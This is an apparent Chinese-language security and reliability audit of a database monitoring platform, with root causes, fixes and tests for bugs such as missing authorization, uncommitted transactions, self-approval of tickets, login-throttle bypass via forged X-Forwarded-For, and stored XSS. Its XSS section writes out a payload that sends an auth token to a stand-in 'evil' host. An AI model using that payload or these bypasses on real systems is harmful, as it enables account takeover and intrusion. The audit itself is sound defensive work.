# DB-AIOps 全量代码审计与缺陷修复设计说明书

> 审计范围：`monitor/`(47202 行 Python) + `frontend/src/`(15996 行 JS/JSX) + `dbmonitor/` 配置
> 审计方式：逐模块通读 + 跨模块调用链回溯 + 并发/事务/权限三维交叉验证
> 缺陷总数：**35 项**（致命 5 / 高危 12 / 中危 18）
> 文档定位：照图施工级——每项含 精确定位 / 复现路径 / 根因 / 影响 / 修复方案 / 验证方法

---

## 0. 缺陷总表

| 编号 | 级别 | 模块 | 一句话摘要 |
|------|------|------|-----------|
| BUG-101 | P0 致命 | timeseries | TimescaleDB 单连接单例被多线程共享，游标交叉污染 |
| BUG-102 | P0 致命 | api_views | 工单「预执行(dry-run)」对未知库类型直接执行真实 SQL |
| BUG-103 | P0 致命 | api_views_perf | 性能中心 11 个端点零权限校验、零数据范围隔离，含 kill 会话 |
| BUG-104 | P0 致命 | auto_remediation | 工单执行从不 commit，PG/MySQL 上报「成功」实际回滚 |
| BUG-105 | P0 致命 | api_views | 工单可自审自批 + 无并发保护导致重复执行 |
| BUG-106 | P1 高危 | auth | 登录爆破防护可用 X-Forwarded-For 伪造完全绕过 |
| BUG-107 | P1 高危 | frontend | 前端权限源自 localStorage，篡改即提权 |
| BUG-108 | P1 高危 | frontend | 报表预览 `dangerouslySetInnerHTML` 存储型 XSS |
| BUG-109 | P1 高危 | db_connector | 目标库连接无语句超时，慢查询拖垮 Web 进程 |
| BUG-110 | P1 高危 | db_connector | PG 长连接不 commit → idle in transaction 阻塞被监控库 VACUUM |
| BUG-111 | P1 高危 | api_views_perf | 阻塞树死锁环永远不显示（DBA 最需要的场景） |
| BUG-112 | P1 高危 | redis_bus | 每次 emit 新建 Redis 连接池 |
| BUG-113 | P1 高危 | sentinel | 哨兵线程异常即永久静默；配置变更不生效 |
| BUG-114 | P1 高危 | sentinel | Oracle 对象名缓存跨实例串味，显示错误表名 |
| BUG-115 | P1 高危 | alert_manager | 聚合窗口时间戳泄漏致聚合一次性失效；共享状态无锁 |
| BUG-116 | P1 高危 | frontend/api | axios 拦截器解引用空 config → TypeError 吞掉真实错误 |
| BUG-117 | P1 高危 | frontend/api | 前端读不到性能中心后端错误消息 |
| BUG-118 | P2 中危 | api_views_perf | `plan_changed_at` 不比对 plan_hash → 误报计划突变 |
| BUG-119 | P2 中危 | plan_capture | SqlPlan `is_current` 并发双写产生多个「当前计划」 |
| BUG-120 | P2 中危 | api_views_perf | TSDB 查询无异常兜底，报 500 而非降级 |
| BUG-121 | P2 中危 | api_views_perf | 阻塞树实时分支异常未降级 |
| BUG-122 | P2 中危 | api_views_perf | EXPLAIN 端点接受任意 SQL 文本送目标库 |
| BUG-123 | P2 中危 | sentinel | MySQL 阻塞会话等待秒被事务年龄覆盖，虚高 |
| BUG-124 | P2 中危 | sentinel | Oracle ASH 不采 sql_text，SQL 详情/建议在 Oracle 上空转 |
| BUG-125 | P2 中危 | frontend | 性能主页「Top 会话」点击无响应（回调未接线） |
| BUG-126 | P2 中危 | api_views_perf | AAS 堆叠序列缺零点，图形错位 |
| BUG-127 | P2 中危 | sentinel | `ASH_INTERVAL_SEC` 默认值前后不一致（5 vs 15） |
| BUG-128 | P2 中危 | timeseries | 批量写逐条 execute，采集吞吐瓶颈 |
| BUG-129 | P2 中危 | timeseries | `drop_hypertable` 漏清理 7A 之后新增的表 |
| BUG-130 | P2 中危 | models | `UserProfileDatabase.config_id` 非外键，删库后残留授权 |
| BUG-131 | P2 中危 | api_views_perf | 期间对比未校验 from < to |
| BUG-132 | P2 中危 | auth | APIKey 5 分钟即失效；`tenancy.py` 整模块死代码 |
| BUG-133 | P2 中危 | frontend | 性能中心 effect 无竞态保护，旧响应覆盖新数据 |
| BUG-134 | P2 中危 | alert_manager | `flush_expired_aggregations` 存在不可达分支 |
| BUG-135 | P2 中危 | api_views | 数据库列表仅返回 `is_active=True`，停用实例在前端消失 |
| BUG-136 | P1 高危 | middleware | 审计中间件写 AuditLog 时 `config` 为空触发 NOT NULL，审计记录静默丢失 |
| BUG-137 | P2 中危 | llm/schemas | jsonschema 缺失时静默跳过 LLM 输出校验（fail-open） |
| BUG-138 | P2 中危 | auth | 登录限流阈值在 import 时求值，配置项运行期无效 |

> BUG-136 ~ 138 是**在测试阶段暴露出来的**：BUG-136 由 BUG-105 的审批用例触发，
> BUG-138 由 BUG-106 的限流用例触发，BUG-137 来自存量 phase8 用例在纯净环境下的失败排查。
> 详见 §五。

---

# 一、P0 致命缺陷

## BUG-101 TimescaleDB 单连接单例被多线程共享

**定位**
- `monitor/timeseries.py:30-55`（`TimeseriesStorage.__init__` / `_get_connection`）
- `monitor/timeseries.py:512-520`（模块级单例 `_timeseries_storage`）
- 消费方：`monitor/api_views_perf.py:59-62`（`_ts_cursor()`）、`monitor/sentinel.py:436-437`、`monitor/plan_capture.py:191-199`

**根因**

`TimeseriesStorage` 是进程级单例，内部只持有**一个** `psycopg2` 连接对象：

```python
self._connection = psycopg2.connect(...)   # 唯一连接
...
def _ts_cursor():
    conn = get_timeseries_storage()._get_connection()
    return conn.cursor() if conn else None   # 所有请求共用同一 conn
```

而调用方是高度并发的：
- `SentinelManager._refresh()` 为**每个实例起一个线程**（`sentinel.py:493`），每 5s 调用 `write_session_samples`
- `start_monitor` 用 `ThreadPoolExecutor`（`start_monitor.py:189`）并发采集
- Django Web 层每个 HTTP 请求线程都调 `_ts_cursor()`

psycopg2 的连接对象**不允许多线程并发执行语句**。同一连接上并发 `execute` 会触发
`InterfaceError: another command is already in progress`，或更糟——A 线程 `fetchall()` 拿到
B 线程的结果集。

**影响**
- 性能中心 AAS/顶级活动/ASH 出现**张冠李戴的数据**（甲库图表显示乙库数据）
- 采集端 `session_sample` 大面积写入失败，日志刷 `[Timeseries] 会话样本写入失败`
- 连接一旦被网络中断（`closed` 属性仍为 0），**永不重连**，整个性能模块直到进程重启前彻底失效

**修复方案**

改为 `psycopg2.pool.ThreadedConnectionPool` + 上下文管理器借还，并加入坏连接自愈：

```python
# timeseries.py
import threading
from contextlib import contextmanager
from psycopg2 import pool as pgpool

class TimeseriesStorage:
    def __init__(self):
        self.enabled = getattr(settings, 'TIMESCALEDB_ENABLED', False)
        self._pool = None
        self._lock = threading.Lock()

    def _get_pool(self):
        if not self.enabled:
            return None
        if self._pool is None:
            with self._lock:
                if self._pool is None:
                    self._pool = pgpool.ThreadedConnectionPool(
                        minconn=1,
                        maxconn=int(getattr(settings, 'TIMESCALEDB_POOL_MAX', 16)),
                        host=..., port=..., dbname=..., user=..., password=...,
                        connect_timeout=10,
                        options='-c statement_timeout=15000',
                    )
        return self._pool

    @contextmanager
    def connection(self):
        """借出一个连接，用完归还；坏连接丢弃不回池。"""
        p = self._get_pool()
        if p is None:
            yield None
            return
        conn = None
        try:
            conn = p.getconn()
            conn.autocommit = True
            yield conn
        except Exception:
            if conn is not None:
                p.putconn(conn, close=True)   # 坏连接销毁
                conn = None
            raise
        finally:
            if conn is not None:
                p.putconn(conn)

    @contextmanager
    def cursor(self):
        with self.connection() as conn:
            if conn is None:
                yield None
                return
            cur = conn.cursor()
            try:
                yield cur
            finally:
                cur.close()
```

`_get_connection()` 保留为**兼容垫片**（返回池中一条连接，标记 deprecated），
所有内部方法（`write_*` / `query_*` / `latest_blocked_count`）改用 `with self.cursor() as cur`。

`api_views_perf._ts_cursor()` 改造为上下文管理器 `_ts_cursor()`，调用点由
`cur = _ts_cursor(); try: ... finally: cur.close()` 改为 `with _ts_cursor() as cur:`。

**验证方法**
1. 单测：20 线程并发调用 `write_session_samples` + `query_session_samples`，断言无异常且行数正确
2. 单测：模拟连接被 kill（`conn.close()` 后放回池），断言下一次调用自动重建
3. 压测：`start_sentinel` 起 5 个实例线程运行 5 分钟，`grep '会话样本写入失败' log` 应为 0

---

## BUG-102 工单「预执行」对未知库类型直接执行真实 SQL

**定位** `monitor/api_views.py:1620-1636`

**根因**

```python
if db_type == 'oracle':      test_sql = f"EXPLAIN PLAN FOR {sql}"
elif db_type in ['mysql',...]: test_sql = f"EXPLAIN {sql}"
elif db_type in ['pgsql',...]: test_sql = f"EXPLAIN {sql}"
else:                          test_sql = sql        # ← 达梦/其它库：原样执行
cursor.execute(test_sql)
```

`dm`（达梦）不在任何分支中，落入 `else`。同时该视图**完全没有调用**
`AutoRemediationEngine._validate_sql_safety()`——白名单校验被绕过。

**复现路径**
1. 对一个 `db_type='dm'` 的实例，在性能中心点「终止会话」生成工单（`sql_command = ALTER SYSTEM KILL SESSION '123' IMMEDIATE`）
2. 调 `POST /api/v1/auditlogs/{id}/dry-run/`
3. 该会话**被真的杀掉了**——用户以为只是"验证语法"

**影响**
名为 dry-run 的接口在达梦库上是**真实执行**。且因绕过白名单，任何被写入
`AuditLog.sql_command` 的语句（含 RCA 引擎自动生成的）都会在 dry-run 阶段落地。

**修复方案**
1. 补齐 `dm` 分支：达梦兼容 Oracle 语法，走 `EXPLAIN PLAN FOR`
2. `else` 分支**不再执行**，直接返回 `unsupported`
3. dry-run 入口先做与执行路径一致的 `_validate_sql_safety()` 校验
4. 抽出公共校验函数，消除执行/预执行两条路径的策略漂移

```python
from monitor.auto_remediation_engine import AutoRemediationEngine

is_safe, reason = AutoRemediationEngine._validate_sql_safety(audit_log.sql_command)
if not is_safe:
    return self.json_response({'status': 'invalid',
                               'message': f'SQL 安全校验失败: {reason}',
                               'sql_preview': audit_log.sql_command}, status=400)
...
EXPLAIN_PREFIX = {
    'oracle': 'EXPLAIN PLAN FOR ', 'dm': 'EXPLAIN PLAN FOR ',
    'mysql': 'EXPLAIN ', 'gbase': 'EXPLAIN ', 'tdsql': 'EXPLAIN ',
    'pgsql': 'EXPLAIN ', 'postgresql': 'EXPLAIN ',
}
prefix = EXPLAIN_PREFIX.get(db_type)
if prefix is None:
    parsed.append({'sql': sql, 'status': 'unsupported',
                   'error': f'{db_type} 不支持预执行语法校验'})
    continue
cursor.execute(prefix + sql)
```

**验证方法**
- 单测：`db_type='dm'` 的工单 dry-run，断言 `cursor.execute` 收到的字符串以 `EXPLAIN PLAN FOR` 开头
- 单测：未知 `db_type='mongo'` → 返回 `unsupported`，`cursor.execute` 调用次数为 0
- 单测：`sql_command='DROP TABLE t'` → dry-run 返回 400 且不触达数据库

---

## BUG-103 性能中心全部端点零权限校验、零数据范围隔离

**定位** `monitor/api_views_perf.py:65-93`（`PerfBaseView`）及其全部 11 个子类

**根因**

```python
class PerfBaseView(View):
    @method_decorator(csrf_exempt)
    @method_decorator(require_auth)      # ← 只验「登录了没」
    def dispatch(self, *a, **k): ...

    def get_config(self, config_id):
        return DatabaseConfig.objects.filter(id=config_id).first()   # ← 不校验归属
```

对比同项目 `api_views.py` 的规范做法（`api_views.py:193` 等 20 余处）：

```python
allowed_db_ids = get_user_database_ids(request.user)
if allowed_db_ids is not None and config_id not in allowed_db_ids:
    return self.error_response('Permission denied', 403)
```

性能中心是后加的模块（Phase 7B），**整体漏掉了这套约束**，全文无一处
`require_permission` / `get_user_database_ids`。

**影响（两条独立的越权链）**

1. **数据越权**：`readonly` 用户、或 `allowed_databases` 被限定为「只能看测试库」的用户，
   可直接 `GET /api/v1/perf/{任意config_id}/ash-facets/` 拿到生产库的**完整 SQL 原文、
   登录用户名、客户端 IP、被锁对象**。ASH 明细是全系统最敏感的数据面。
2. **操作越权**：`SessionKillView`（`api_views_perf.py:815-840`）同样只有 `require_auth`。
   任何登录用户可对任意实例提交 `KILL_SESSION` 高危工单。虽然工单需审批才执行，
   但配合 BUG-105（自审自批），一个 `dba` 角色用户即可对**权限外的实例**完成杀会话闭环。

叠加 BUG-107（前端权限可篡改），越权链完整闭合。

**修复方案**

在 `PerfBaseView` 统一收口，子类零改动：

```python
from monitor.auth import Perm, get_user_database_ids, has_permission, require_auth

class PerfBaseView(View):
    # 子类可覆盖：只读端点用 METRICS_VIEW，写操作端点提权
    required_perm = Perm.METRICS_VIEW

    @method_decorator(csrf_exempt)
    @method_decorator(require_auth)
    def dispatch(self, request, *a, **k):
        if not has_permission(request.user, self.required_perm):
            return self.err('FORBIDDEN', f'缺少权限: {self.required_perm}', 403)
        return super().dispatch(request, *a, **k)

    def get_config(self, config_id):
        """按用户数据范围取实例；越权与不存在统一返回 None（不泄露实例存在性）。"""
        allowed = get_user_database_ids(self._request.user)
        qs = DatabaseConfig.objects.filter(id=config_id)
        if allowed is not None:
            qs = qs.filter(id__in=allowed)
        return qs.first()
```

- `dispatch` 中把 `request` 暂存到 `self._request`，供 `get_config` 使用（Django CBV 的
  `self.request` 在 `super().dispatch()` 内才赋值，此处需显式保存）
- `SessionKillView.required_perm = Perm.TICKETS_CREATE`（提交高危工单等价于建工单）
- `SqlExplainView.required_perm = Perm.SQL_MONITORING_VIEW`
- `SqlPlanDetailView` 原本连 `get_config` 都不调，直接 `SqlPlan.objects.filter(config_id=...)`，
  需补 `if not self.get_config(config_id): return 404`

**验证方法**
- 单测：`readonly` 用户（无 `sql_monitoring.view`）访问 `/perf/1/sql/{d}/explain/` → 403
- 单测：`allowed_databases=[2]` 的用户访问 `/perf/1/aas/` → 404（不是 403，避免探测）
- 单测：同用户访问 `/perf/2/aas/` → 200
- 单测：`readonly` POST kill → 403，且 `AuditLog.objects.count() == 0`

---

## BUG-104 工单执行从不 commit，PG/MySQL 上报「成功」实际回滚

**定位** `monitor/auto_remediation_engine.py:380-407`

**根因**

```python
cursor = db_connection.cursor()
for sql in sql_commands:
    cursor.execute(sql)
audit.status = 'success'
audit.execution_result = f"执行成功\n受影响行数：{cursor.rowcount}"
```

全流程**没有 `db_connection.commit()`**。而连接的自动提交状态是：

| 库 | 驱动 | autocommit 默认 | 后果 |
|----|------|----------------|------|
| PostgreSQL | psycopg2 (`db_connector.py:140`) | **False** | 事务在 `close_db_connection` 时被隐式 ROLLBACK |
| MySQL/TDSQL/GBase | pymysql (`db_connector.py:106`) | **False** | 同上 |
| Oracle/DM | oracledb / pyodbc | False | 同上 |

`SELECT pg_terminate_backend()` / `KILL` 是即时生效的非事务操作，恰好"看起来正常"，
掩盖了这个缺陷。但白名单里的 `ALTER TABLESPACE` / `ALTER DATABASE DATAFILE`
（`auto_remediation_engine.py:30-33`）在 PG 上是 DDL，**会被完整回滚**。

**影响**
DBA 点「执行」→ 界面显示"操作执行成功，受影响行数 N" → 表空间实际**没有扩容** →
半小时后表空间打满，故障升级。这是最危险的一类缺陷：**系统对操作者撒谎**。

**修复方案**

```python
cursor = db_connection.cursor()
try:
    for sql in sql_commands:
        ...
        cursor.execute(sql)
        if cursor.description:
            results.append(cursor.fetchall())
    # 显式提交：驱动默认 autocommit=False，不提交则连接关闭时回滚
    try:
        db_connection.commit()
    except Exception:
        pass   # 已是 autocommit 的连接会抛错，忽略
    audit.status = 'success'
    ...
except Exception as e:
    try:
        db_connection.rollback()
    except Exception:
        pass
    audit.status = 'failed'
    ...
```

同时 `AuditLogExecuteDryRunView` 在 finally 中补 `rollback()`，
确保 `EXPLAIN` 打开的只读事务不残留（关联 BUG-110）。

**验证方法**
- 单测：mock 连接，断言成功路径调用了 `commit()`、失败路径调用了 `rollback()`
- 集成：对 PG 实例执行一条建表工单，重连后 `\dt` 应能看到该表

---

## BUG-105 工单可自审自批 + 无并发保护导致重复执行

**定位** `monitor/api_views.py:1400-1420`（approve）、`1473-1543`（execute）

**根因（两个独立缺陷，同一治理面）**

**(a) 自审自批**：`AuditLogApproveView.post` 只校验角色是 `dba`/`super_admin` 和数据范围，
**不检查审批人是否就是申请人**。`SessionKillView`（`api_views_perf.py:838`）把
`executor=request.user.username` 写入工单，同一个 DBA 随后调 approve 即可自批。
四眼原则（four-eyes）形同虚设。

**(b) 重复执行**：

```python
audit_log = AuditLog.objects.get(id=audit_id)     # 无行锁
if audit_log.status != 'approved':                # 检查
    return ...
...
engine.execute_operation(...)                     # 使用
```

典型的 TOCTOU。两个并发请求（前端双击、或重试）都读到 `approved`，
都进入执行。`execute_operation` 内部再读一次状态（`auto_remediation_engine.py:362`）
同样无锁，无法拦截。对 `ALTER TABLESPACE ... ADD DATAFILE` 意味着**加了两个数据文件**。

**修复方案**

(a) 审批人分离，可通过配置开关（单人运维场景可关闭）：

```python
# settings.py
AUDIT_REQUIRE_SEPARATE_APPROVER = os.environ.get(
    'AUDIT_REQUIRE_SEPARATE_APPROVER', 'True').lower() in ('true', '1', 'yes')

# api_views.py AuditLogApproveView.post
if getattr(settings, 'AUDIT_REQUIRE_SEPARATE_APPROVER', True):
    applicant = (audit_log.executor or '').strip()
    if applicant and applicant == request.user.username:
        return self.error_response(
            '不能审批自己提交的工单（职责分离）。请由其他 DBA 审批。', 403)
```

(b) 用 `select_for_update` + 状态机原子迁移：

```python
from django.db import transaction

with transaction.atomic():
    try:
        audit_log = AuditLog.objects.select_for_update().get(id=audit_id)
    except AuditLog.DoesNotExist:
        return self.error_response('Audit log not found', 404)
    if audit_log.status != 'approved':
        return self.error_response(
            f"操作状态为 '{audit_log.status}'，只能执行已批准的工单", 400)
    # 抢占：先置 executing 再出临界区，第二个请求进来只会看到 executing
    audit_log.status = 'executing'
    audit_log.executor = request.user.username
    audit_log.execute_time = timezone.now()
    audit_log.save(update_fields=['status', 'executor', 'execute_time'])
```

`execute_operation` 相应放宽为接受 `approved` 或 `executing`（因为抢占已把状态推进）。
`AuditLogRejectView` 补状态校验：仅 `pending` 可拒绝。

**验证方法**
- 单测：同一用户 create + approve → 403；换用户 approve → 200
- 单测：`AUDIT_REQUIRE_SEPARATE_APPROVER=False` 时自批放行
- 并发测：10 线程同时 POST execute，断言 `cursor.execute` 只被调用一次
- 单测：对已执行工单 reject → 400

---

# 二、P1 高危缺陷

## BUG-106 登录爆破防护可用 X-Forwarded-For 伪造完全绕过

**定位** `monitor/auth.py:759-763`

```python
def _client_ip(request):
    xff = request.META.get('HTTP_X_FORWARDED_FOR', '')
    if xff:
        return xff.split(',')[0].strip()      # ← 无条件信任客户端头
    return request.META.get('REMOTE_ADDR', 'unknown')
```

失败计数键是 `sha256(username:ip)`（`auth.py:754-756`）。攻击者每次请求带一个
随机 `X-Forwarded-For`，即可让计数器永远停在 1，锁定逻辑（`auth.py:787`）永不触发。

**影响** BUG-006 修复的登录爆破防护实际上是**装饰性的**。配合弱口令即可暴力破解。

**修复方案** 引入可信代理配置，只在请求来自可信代理时才采信 XFF：

```python
# settings.py
TRUSTED_PROXY_IPS = [ip.strip() for ip in os.environ.get(
    'DJANGO_TRUSTED_PROXY_IPS', '').split(',') if ip.strip()]
TRUSTED_PROXY_DEPTH = int(os.environ.get('DJANGO_TRUSTED_PROXY_DEPTH', '1'))

# auth.py
def _client_ip(request):
    remote = request.META.get('REMOTE_ADDR', '') or 'unknown'
    trusted = getattr(settings, 'TRUSTED_PROXY_IPS', None) or []
    if remote not in trusted:
        return remote                      # 直连：XFF 一律不信
    xff = request.META.get('HTTP_X_FORWARDED_FOR', '')
    if not xff:
        return remote
    parts = [p.strip() for p in xff.split(',') if p.strip()]
    depth = max(1, int(getattr(settings, 'TRUSTED_PROXY_DEPTH', 1)))
    # 从右往左跳过 depth 跳可信代理，取真实客户端
    idx = len(parts) - depth
    return parts[idx] if 0 <= idx < len(parts) else parts[0]
```

同时补一道**账号维度**的独立计数（不含 IP），防止分布式换 IP 爆破：

```python
def _login_user_count_key(username): return f"login_fail_u_{sha256(username.lower())[:24]}"
LOGIN_MAX_ATTEMPTS_PER_USER = 20   # 窗口内该账号全网失败上限
```

并把 `check_login_allowed` 返回值改为真实剩余秒（用 `cache.ttl` 或存绝对到期时间戳）。

**验证方法**
- 单测：`REMOTE_ADDR` 不在可信列表时，伪造 XFF 不改变计数键 → 第 6 次登录被 429
- 单测：`REMOTE_ADDR` 在可信列表时，XFF 生效
- 单测：同一账号从 20 个不同 IP 各失败 1 次 → 账号级锁定触发

---

## BUG-107 前端权限源自 localStorage，篡改即提权

**定位** `frontend/src/utils/permission.js:125-158`、`frontend/src/App.jsx:37-41`、`frontend/src/components/EMLayout.jsx:49-55`

```js
export function getUserRole() {
  const parsed = JSON.parse(localStorage.getItem('user'));
  return parsed.role;
}
export function hasPermission(code) {
  if (getUserRole() === 'super_admin') return true;   // ← 用户可自行改写
  ...
}
```

浏览器控制台一行 `localStorage.setItem('user', JSON.stringify({role:'super_admin'}))`
即可让全部菜单、全部路由、全部按钮解锁。

**影响评估**
前端鉴权本就只是 UX 层，真正的防线在后端。问题在于**后端防线有洞**：
BUG-103 让性能中心（含 kill 会话）只需 `require_auth`。两者叠加 = 真实提权。

**修复方案（纵深防御，三层）**
1. **后端是唯一权威**——BUG-103 修完后，前端篡改只会让按钮可见、请求 403
2. 前端权限**不再信任 localStorage 的 role 字段做短路**：`super_admin` 短路移除，
   一律走 `permissions` 数组匹配；`permissions` 每次进入应用时由
   `GET /api/v1/users/me/` 刷新（该接口返回服务端计算的权限）
3. 增加会话级校验：`App.jsx` 挂载时调 `authAPI.getCurrentUser()`，
   用响应覆盖 localStorage，失败则登出

```js
// permission.js —— 移除 role 短路，只认服务端下发的 permissions
export function hasPermission(permissionCode) {
  return getUserPermissions().includes(permissionCode);
}
```
（服务端 `get_user_permissions` 对 `super_admin` 已返回全量权限清单，
 见 `auth.py:399-401`，因此移除短路不会误伤超管。）

**验证方法**
- 手工：篡改 localStorage role → 菜单仍按真实权限渲染
- 单测（后端）：篡改后的请求命中 403
- 单测（前端）：`hasPermission` 在 `permissions=[]` 且 `role='super_admin'` 时返回 false

---

## BUG-108 报表预览 `dangerouslySetInnerHTML` 存储型 XSS

**定位** `frontend/src/pages/ReportList.jsx:188`

```jsx
<div dangerouslySetInnerHTML={{ __html: previewHtml }} />
```

`previewHtml` 来自 `report_engine.py` 生成的报表 HTML，其中嵌入了**来自被监控数据库的
数据**：表名、SQL 原文、用户名、告警描述。攻击者只要能在被监控库里建一张名为
`<img src=x onerror="fetch('//evil/?t='+localStorage.auth_token)">` 的表，
或让一条慢 SQL 文本包含该串，DBA 打开报表预览即中招——**直接窃取 token**（BUG-107 的放大器）。

**修复方案** 双保险：
1. 前端引入 DOMPurify 净化后再渲染
2. 后端 `report_engine` 对所有插值做 HTML 转义

```jsx
import DOMPurify from 'dompurify';

const safeHtml = useMemo(
  () => DOMPurify.sanitize(previewHtml || '', {
    ALLOWED_TAGS: ['div','span','p','br','hr','h1','h2','h3','h4','h5','h6',
                   'table','thead','tbody','tr','th','td','ul','ol','li',
                   'strong','em','b','i','code','pre','a'],
    ALLOWED_ATTR: ['class', 'style', 'colspan', 'rowspan'],
    FORBID_TAGS: ['script','style','iframe','object','embed','form','input'],
    FORBID_ATTR: ['onerror','onload','onclick','onmouseover','srcset','src'],
  }),
  [previewHtml]);

<div dangerouslySetInnerHTML={{ __html: safeHtml }} />
```

后端 `report_engine.py` 所有 f-string 插值改为 `html.escape(str(v))`。

**验证方法**
- 单测（前端）：输入 `<img src=x onerror=alert(1)>` → 净化后不含 `onerror`
- 单测（后端）：数据库名含 `<script>` → 生成的 HTML 中为 `&lt;script&gt;`

---

## BUG-109 目标库连接无语句超时，慢查询拖垮 Web 进程

**定位** `monitor/db_connector.py:69-73`（Oracle）、`106-116`（MySQL）、`140-147`（PG）、`168-175`（DM）

`api_views_perf.py:86` 的注释写着「实时直连 (只读, 3s 语句超时由各端点自行遵守预算)」，
但**没有任何端点设置过语句超时**，连接层也没有。

- Oracle：无 `call_timeout`
- PG：只有 `connect_timeout=10`，无 `statement_timeout`
- MySQL：`read_timeout=30`（仅 socket 读，且 30s 已远超 Web 请求预算）
- DM：`timeout=10` 仅登录超时

**影响**
被监控库负载高时，`SELECT ... FROM v$session`（`SessionsLiveView`、`BlockingTreeView`、
`RunningSqlView` 都会实时直连）可能挂住几十秒。Web worker 被占满 →
**监控系统自己先挂**，而且是在被监控库最需要观察的时刻挂。这是监控系统的经典自杀模式。

**修复方案** 连接层统一注入超时，并允许按用途覆盖：

```python
# db_connector.py
DEFAULT_STATEMENT_TIMEOUT_MS = 5000

@staticmethod
def get_connection(config, statement_timeout_ms=None):
    t = statement_timeout_ms or getattr(
        settings, 'TARGET_DB_STATEMENT_TIMEOUT_MS', DEFAULT_STATEMENT_TIMEOUT_MS)
    ...

# PG：连接参数直接下发
conn = psycopg2.connect(..., options=f'-c statement_timeout={t}')

# MySQL：连接后设会话变量
conn = pymysql.connect(..., read_timeout=max(10, t // 1000 + 5))
with conn.cursor() as c:
    c.execute("SET SESSION max_execution_time=%s", (t,))       # MySQL 5.7.8+
    c.execute("SET SESSION innodb_lock_wait_timeout=5")

# Oracle：驱动级
conn = oracledb.connect(...)
conn.call_timeout = t          # 毫秒

# DM(pyodbc)：
conn.timeout = max(1, t // 1000)
```

MySQL 的 `max_execution_time` 对老版本不存在，用 `try/except` 包裹静默降级。

性能中心的实时端点（`live_conn`）显式传 `statement_timeout_ms=3000`，兑现文档承诺。

**验证方法**
- 集成：对 PG 执行 `SELECT pg_sleep(30)` → 3s 内抛 `QueryCanceled`
- 单测：断言 psycopg2.connect 收到 `options` 含 `statement_timeout`
- 单测：断言 pymysql 连接后执行了 `SET SESSION max_execution_time`

---

## BUG-110 PG 长连接不 commit → idle in transaction 阻塞被监控库 VACUUM

**定位** `monitor/db_connector.py:140-147` + `monitor/sentinel.py:300-306, 414-427`

psycopg2 默认 `autocommit=False`。`InstanceSentinel` 持有**长期不关闭**的连接
（`self.conn`，仅在探活失败时重建），每 5s 执行一次 `SELECT ... FROM pg_stat_activity`。
第一条 SELECT 就隐式 `BEGIN`，此后**永不 COMMIT**。

**影响**（这是最隐蔽也最严重的一条：监控工具主动损害被监控对象）
1. 该后端在 `pg_stat_activity` 中长期显示 `idle in transaction`
2. 其持有的事务快照压住 `xmin` → **VACUUM 无法回收任何更新行的死元组**
3. 被监控库表膨胀、索引膨胀、查询逐日变慢
4. 极端情况触发 `autovacuum_freeze_max_age`，逼近事务号回卷

DBA 排查性能问题时，会发现罪魁祸首正是监控系统自己。

**修复方案** 三重：

```python
# 1) db_connector 连接后立即开自动提交（监控只读，无需事务）
conn = psycopg2.connect(...)
conn.autocommit = True
conn.set_session(readonly=True, autocommit=True)   # 只读会话，双保险

# 2) sentinel 每轮采样后显式收尾（兼容非 autocommit 的驱动）
def _end_txn(self):
    try:
        if hasattr(self.conn, 'rollback'):
            self.conn.rollback()
    except Exception:
        pass
# ash_sample / probe 的 finally 中调用

# 3) 长连接定期重建，避免任何形式的资源累积
SENTINEL_CONN_MAX_AGE_SEC = 1800
# InstanceSentinel 记录 self._conn_created_at，超龄则主动重连
```

`set_session(readonly=True)` 额外提供了一道保险：即便某条采集 SQL 写错，
也无法在被监控库上产生写入。

**验证方法**
- 集成：起哨兵 10 分钟，在被监控 PG 上
  `SELECT state, xact_start FROM pg_stat_activity WHERE application_name LIKE '%'`
  → 监控连接的 `state` 应为 `idle`（不是 `idle in transaction`），`xact_start` 为 NULL
- 单测：断言 psycopg2 连接建立后 `autocommit is True`
- 单测：模拟连接超龄 → 断言触发重连

---

## BUG-111 阻塞树死锁环永远不显示

**定位** `monitor/api_views_perf.py:391`

```python
roots = sorted(set(edges.values()) - set(edges.keys()))
```

`edges` 是 `{waiter: blocker}`。根阻塞者 = 「是别人的 blocker，但自己不是 waiter」。
**当出现环时**（A 等 B，B 等 A —— 即死锁，或 A→B→C→A 的循环等待），
环上每个节点都既是 blocker 又是 waiter，全部被减掉，`roots` 为空 → 返回空树。

前端 `BlockingTab.jsx:104-106` 收到空树后展示：**「当前无阻塞链」（绿色成功提示）**。

**影响**
数据库正处于死锁/循环等待——DBA 打开阻塞分析页最想看到的场景——
系统告诉他一切正常。这是功能性的致命误导，比不实现更糟。

**修复方案** 补齐环检测，把环识别为独立的「死锁环」根：

```python
def _build_blocking_tree(rows):
    ...
    children = {}
    for waiter, blocker in edges.items():
        children.setdefault(blocker, []).append(waiter)

    def build(sid, visited, path):
        if sid in path:                        # 命中环
            return {'session_id': sid, 'cycle_ref': True, 'children': [],
                    'subtree_waiters': 0, 'killable': False}
        if sid in visited:
            return None
        visited.add(sid)
        n = dict(nodes.get(sid, {'session_id': sid}))
        kids = [build(c, visited, path | {sid}) for c in sorted(children.get(sid, []))]
        n['children'] = [k for k in kids if k]
        n['subtree_waiters'] = sum(1 + k.get('subtree_waiters', 0) for k in n['children'])
        n['wait_secs'] = n.get('active_secs')
        n['killable'] = not n.get('placeholder', False)
        return n

    # ① 常规根：是 blocker 但不是 waiter
    roots = sorted(set(edges.values()) - set(edges.keys()))
    visited, tree = set(), []
    for r in roots:
        t = build(r, visited, frozenset())
        if t:
            t['role'] = 'root_blocker'
            tree.append(t)

    # ② 环检测：剩余未访问且在 edges 中的节点必然构成环
    cycles = _find_cycles(edges, exclude=visited)
    for cyc in cycles:
        head = cyc[0]
        t = build(head, visited, frozenset())
        if t:
            t['role'] = 'deadlock_cycle'
            t['cycle_members'] = cyc
            tree.append(t)

    tree.sort(key=lambda n: (n.get('role') != 'deadlock_cycle', -n['subtree_waiters']))
    return tree


def _find_cycles(edges, exclude):
    """在 waiter->blocker 有向图中找出所有环（每节点出度<=1，用迭代追踪即可）。"""
    seen, cycles = set(exclude), []
    for start in edges:
        if start in seen:
            continue
        path, cur = [], start
        while cur in edges and cur not in seen:
            if cur in path:                      # 找到环
                cycles.append(path[path.index(cur):])
                break
            path.append(cur)
            cur = edges[cur]
        seen.update(path)
    return cycles
```

前端 `BlockingTab.jsx` 增加 `deadlock_cycle` 角色渲染（红色「死锁环」标签 + 环成员列表），
并把「当前无阻塞链」的判断从 `tree.length` 改为同时检查是否有环。

**验证方法**
- 单测：`rows` 构造 A↔B 互等 → 返回 1 棵 `role='deadlock_cycle'` 的树，`cycle_members` 含 A、B
- 单测：A→B→C→A 三节点环 → 正确识别
